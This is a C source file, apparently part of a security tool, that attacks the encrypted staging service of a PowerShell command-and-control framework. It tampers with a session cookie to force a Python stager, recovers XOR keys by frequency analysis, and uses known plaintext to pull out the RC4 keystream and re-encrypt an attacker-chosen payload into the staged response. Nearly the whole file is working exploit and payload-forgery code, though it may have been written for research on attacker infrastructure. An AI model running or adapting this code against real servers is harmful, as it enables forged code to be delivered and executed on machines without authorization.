/*
BSD 3-Clause License

Copyright (c) 2017, John Ventura
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this
  list of conditions and the following disclaimer.

* Redistributions in binary form must reproduce the above copyright notice,
  this list of conditions and the following disclaimer in the documentation
  and/or other materials provided with the distribution.

* Neither the name of the copyright holder nor the names of its
  contributors may be used to endorse or promote products derived from
  this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/stat.h>

#include "global.h"

void xormem(uint8_t * start, uint8_t * key, int keylen)
{
    int i;
    for (i = 0; i < keylen; i++) {
        start[i] = start[i] ^ key[i];
    }
}

uint8_t *xorstr(char *str, char *key)
{
    int keylen;
    int keyoffset;
    int i;

    uint8_t *outbuf;
    outbuf = (uint8_t *) malloc(strlen(str) + 1);
    if (outbuf == NULL) {
        perror("can't allocate memory");
        exit(1);
    }
    memset(outbuf, 0x00, (strlen(str) + 1));

    keylen = strlen(key);
    keyoffset = 0;
    for (i = 0; i < strlen(str); i++) {
        outbuf[i] = str[i] ^ key[keyoffset++];
        if (keyoffset == keylen) {
            keyoffset = 0;
        }
    }
    return (outbuf);
}
/*
 * Base64 encoding/decoding (RFC1341)
 * Copyright (c) 2005-2011, Jouni Malinen <j@w1.fi>
 *
 * This software may be distributed under the terms of the BSD license.
 * See README for more details.
 */

/**
 * base64_encode - Base64 encode
 * @src: Data to be encoded
 * @len: Length of the data to be encoded
 * @out_len: Pointer to output length variable, or %NULL if not used
 * Returns: Allocated buffer of out_len bytes of encoded data,
 * or %NULL on failure
 *
 * Caller is responsible for freeing the returned buffer. Returned buffer is
 * nul terminated to make it easier to use as a C string. The nul terminator is
 * not included in out_len.
 */
static const unsigned char base64_table[65] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
unsigned char *base64_encode(const unsigned char *src, int len)
{
    unsigned char *out, *pos;
    const unsigned char *end, *in;
    int olen;
    int line_len;

    olen = len * 4 / 3 + 4;	/* 3-byte blocks to 4-byte */
    olen += olen / 72;		/* line feeds */
    olen++;			/* nul termination */
    if (olen < len)
	return NULL;		/* integer overflow */
    out = malloc(olen);
    if (out == NULL) {
	perror("can't allocate memory");
	exit(1);
    }

    end = src + len;
    in = src;
    pos = out;
    line_len = 0;
    while (end - in >= 3) {
	*pos++ = base64_table[in[0] >> 2];
	*pos++ = base64_table[((in[0] & 0x03) << 4) | (in[1] >> 4)];
	*pos++ = base64_table[((in[1] & 0x0f) << 2) | (in[2] >> 6)];
	*pos++ = base64_table[in[2] & 0x3f];
	in += 3;
	line_len += 4;
	if (line_len >= 72) {
	    *pos++ = '\n';
	    line_len = 0;
	}
    }

    if (end - in) {
	*pos++ = base64_table[in[0] >> 2];
	if (end - in == 1) {
	    *pos++ = base64_table[(in[0] & 0x03) << 4];
	    *pos++ = '=';
	} else {
	    *pos++ = base64_table[((in[0] & 0x03) << 4) | (in[1] >> 4)];
	    *pos++ = base64_table[(in[1] & 0x0f) << 2];
	}
	*pos++ = '=';
	line_len += 4;
    }

    if (line_len)
	*pos++ = '\n';

    *pos = '\0';
    return out;
}


/**
 * base64_decode - Base64 decode
 * @src: Data to be decoded
 * @len: Length of the data to be decoded
 * @out_len: Pointer to output length variable
 * Returns: Allocated buffer of out_len bytes of decoded data,
 * or %NULL on failure
 *
 * Caller is responsible for freeing the returned buffer.
 */
uint8_t *base64_decode(const unsigned char *src, int *outlen)
{
    unsigned char dtable[256], *out, *pos, block[4], tmp;
    int i, count, olen;
    int pad = 0;

    memset(dtable, 0x80, 256);
    for (i = 0; i < sizeof(base64_table) - 1; i++)
	dtable[base64_table[i]] = (unsigned char) i;
    dtable['='] = 0;

    count = 0;
    for (i = 0; i < strlen(src); i++) {
	if (dtable[src[i]] != 0x80)
	    count++;
    }

    if (count == 0 || count % 4)
	return NULL;

    olen = count / 4 * 3;
    pos = out = malloc(olen);
    if (out == NULL) {
	perror("can't allocate memory");
	exit(1);
    }

    count = 0;
    for (i = 0; i < strlen(src); i++) {
	tmp = dtable[src[i]];
	if (tmp == 0x80)
	    continue;

	if (src[i] == '=')
	    pad++;
	block[count] = tmp;
	count++;
	if (count == 4) {
	    *pos++ = (block[0] << 2) | (block[1] >> 4);
	    *pos++ = (block[1] << 4) | (block[2] >> 2);
	    *pos++ = (block[2] << 6) | block[3];
	    count = 0;
	    if (pad) {
		if (pad == 1)
		    pos--;
		else if (pad == 2)
		    pos -= 2;
		else {
		    /* Invalid padding */
		    free(out);
		    return NULL;
		}
		break;
	    }
	}
    }

    *outlen = pos - out;
    return out;
}

// take a Powershell Session cookie and use XOR
// to toggle the "language" byte between 0x01 and 0x02
// we do this, in case we download an encrypted powershell
// script. We really want python, because it has less 
// entropy.

char *swaplanguage(char *session)
{

    int out;
    uint8_t *raw;


    raw = base64_decode(session, &out);
    if ((raw == NULL) || (out != 20)) {
	fprintf(stderr, "invalid cookie");
	exit(1);
    }
    raw[12] = raw[12] ^ 0x03;

    return (base64_encode(raw, 20));
}

// extract the XOR key from a ciphertext of ciphertextlen bytes
// keylen is the length of the key you expect to find
// this script assumes that the only possible values in the key are
// 012345679abcdef
// it also assumes you are "decrypting" powershell scripts

char *grabxorkey(char *ciphertext, int ciphertextlen, int keylen)
{
    int i;
    int keyoffset;
    int pos;
    int score;
    int highscore;
    char charbuf;
    char outchar;
    // I did frequency counts for PowerShell scripts
    char *highfreq = "pDO\\m\"'-[]yP()lcdRnCasN=Io;AirTt SE.e$";
    // the keys are limited to these characters
    char *candidates = "0123456789abcdef";
    char *outkey;

    // this is where we store the key we are looking for
    outkey = (char *) malloc(keylen + 1);
    if (outkey == NULL) {
	perror("can't allocate memory");
	exit(1);
    }
    memset(outkey, 0x00, keylen + 1);

    // guess every possible key value for each offset in the key
    for (keyoffset = 0; keyoffset < keylen; keyoffset++) {
	highscore = 0;
	for (i = 0; i < strlen(candidates); i++) {
	    // when we start guessing, every high frequency 
	    // character counts as a hit, so if we xor(cipher, guess)
	    // and we get a high frequency character, we get lots of
	    // points. normal letters are less points
	    score = 0;
	    for (pos = keyoffset; pos < (ciphertextlen - keylen);
		 pos = pos + keylen) {
		charbuf = (candidates[i] ^ ciphertext[pos]);
		// points if it is a letter
		if (isalpha(charbuf)) {
		    score++;
		}
		// extra points for high frequency characters
		if (strchr(highfreq, (int) charbuf) != NULL) {
		    score++;
		}
		// EVERY character should be on your keyboard
		if (!isascii(charbuf)) {
		    score = -10;
		}

	    }
	    if (score > highscore) {
		outchar = candidates[i];
		highscore = score;
	    }
	}
	outkey[keyoffset] = outchar;
    }
    return (outkey);
}

// figures out the XOR key used to "encrypt" URL
// it's a front end for "grabxorkey()"
char *grabkey(char *url, int keylen)
{
    char *keybuf;
    int outputsize;
    uint8_t **output;

    outputsize = urltomem(url, "abc", &output);

    if (keylen > outputsize) {
        perror("file too small");
        exit(1);
    }

    keybuf = (char *)grabxorkey((char *)output, outputsize, keylen);
    free(output);

    /* we're done with libcurl, so clean it up */

    return (keybuf);
}

uint8_t *packageRC4data(char *url, char *cookie, char *pfilename,
                        char *payload)
{
    uint8_t *output;
    uint8_t **stagebuf;
    int stagebufsize;
    int ivsize = 4;

    FILE *source;
    struct stat info;
    uint8_t *filebuf;

    // read the template into memory at *filebuf
    if (stat(pfilename, &info) < 0) {
        perror("can not access file");
        exit(1);
    }
    filebuf = (uint8_t *) malloc(info.st_size);
    if (filebuf == NULL) {
        perror("can't allocate memory");
        exit(1);
    }

    source = fopen(pfilename, "rb");
    if (source <= 0) {
        perror("can't allocate memory");
        exit(1);
    }
    if(fread(filebuf, info.st_size, 1, source) == 0) {
		fprintf(stderr, "can't read file\n");
		exit(1);
	}
    fclose(source);

    // read the staging payload into *stagebuf
    stagebufsize = urltomem(url, cookie, &stagebuf);
    // Powershell case swapping makes RC4 attacks harder
    // so we modify the cookie to make sure we get Python
    if (stagebufsize < info.st_size) {
        if (verbose) {
            printf("modifying session key for Python\n");
        }
        stagebufsize = urltomem(url, swaplanguage(cookie), &stagebuf);
    }

    if (stagebufsize < (strlen(payload) + ivsize)) {
        fprintf(stderr, "The payload won't fit\n");
        fprintf(stderr, "original ciphertext is too small\n");
        exit(1);
    }
    if (info.st_size < (strlen(payload) + ivsize)) {
        fprintf(stderr, "The payload won't fit\n");
        fprintf(stderr, "Known plaintext is too small\n");
        exit(1);
    }


    output = (uint8_t *) stagebuf;
    // extract the RC4 PRNG output key
    xormem(output + 4, filebuf, strlen(payload));
    // now encode our data
    xormem(output + 4, payload, strlen(payload));

    return (output);
}




